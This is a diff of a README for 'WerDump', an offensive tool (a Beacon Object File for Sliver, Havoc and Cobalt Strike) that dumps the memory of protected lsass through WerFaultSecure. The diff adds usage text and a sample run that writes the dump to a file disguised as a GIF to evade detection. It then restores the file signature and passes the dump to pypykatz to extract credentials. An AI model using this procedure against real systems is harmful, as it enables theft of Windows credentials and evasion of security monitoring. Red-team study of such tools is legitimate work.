@@ -1,19 +1,64 @@
 # WerDump
-A Beacon Object File BOF for Havoc/CS to dump Process Protected Lsass using WerFaultSecure.
 
-![Havoc](dst/screenshot.png)
+A Beacon Object File BOF for Sliver, Havoc and CS to dump Process Protected Lsass using WerFaultSecure.
 
-By default this BOF, writes `WerFaultSecure.exe` to the `temp` directory of the user's context with a random filename and saves the dump in the same directory as `.dll`.
-This is a POC Bof, It could be extended and modified the way you like and add many improvements like remote dump.
-All temporary files gets cleaned up after the dump.
+## Sliver
 
-==WARNING== to prevent the system from becoming unresponsive, you must use `WerResume` to resume the `lsass.exe` process from a different beacon (process) before you execute `WerDump`, so make sure to run `WerResume` first then `WerDump` within a second.
-`WerDump` beacon process is affected by the Process Protection Policy established by the child process `WerFaultSecure`, which prevents it from opening a handle to lsass.exe. This is why it can't resume lsass.exe on its own.
-`WerResume` includes a 5-second delay to give you enough time to execute `WerDump` while lsass.exe is suspended. for increased safety, you can modify the code to extend this delay.
+```shell
+sliver > werdump --help
+
+Overcome PPL with WerFaultSecure and Dump Lsass
+
+Usage:
+======
+  werdump [flags] wer-path pid dump-path signature
+
+Args:
+=====
+  wer-path   string    The path of the WerFaultSecure file.
+  pid        int       The PID of the process you want to dump.
+  dump-path  string    The name of the dump file.
+  signature  string    Signature used for evasion (default: MDMP).
+
+Flags:
+======
+  -h, --help           display help
+  -t, --timeout int    command timeout in seconds (default: 60)
+```
+
+```shell
+sliver (PROPER_OBJECTIVE) > werdump 'C:\Programdata\WerFaultSecure.exe' 564 'C:\Programdata\lsass.gif' GIF8
+
+[*] Successfully executed werdump (coff-loader)
+[*] Got output:
+[+] Enabled SeDebugPrivilege
+[*] Main thread ID for PID 564: 576
+[+] SUCCESS! Created PPL Process With Pid: [4208], Protection Level [0]
+[+] Successfully Dumped process 564, Find the dump in the following path C:\Programdata\lsass.gif
+[+] Successfully resumed process with PID: 564
+```
+
+This BOF take the path to `WerFaultSecure.exe`, pid of the process to dump, the dump path and the signature to modify the first four bytes of the dump file.
+
+To install the extension on sliver
+
+```shell
+$ make install
+```
+
+To restore the magic bytes
+
+```shell
+$ python3 Scripts/Restore.py lsass.gif lsass.dump GIF8
+Successfully restored MiniDump signature in 'lsass.dump'
+Now run [ pypykatz lsa minidump lsass.dump ] to parse the minidump
+```
+
+## Havoc
+
+See the original implementation
 
 # Credits
-Thanks to Two Seven One Three  [TwoSevenOneT - WSASS](https://github.com/TwoSevenOneT/WSASS)
 
-# Author: 
-[ybenel](https://github.com/m1ndo)
-
+- Two Seven One Three  [TwoSevenOneT - WSASS](https://github.com/TwoSevenOneT/WSASS)
+- M1ndo [WerDump](https://github.com/M1ndo/WerDump/)
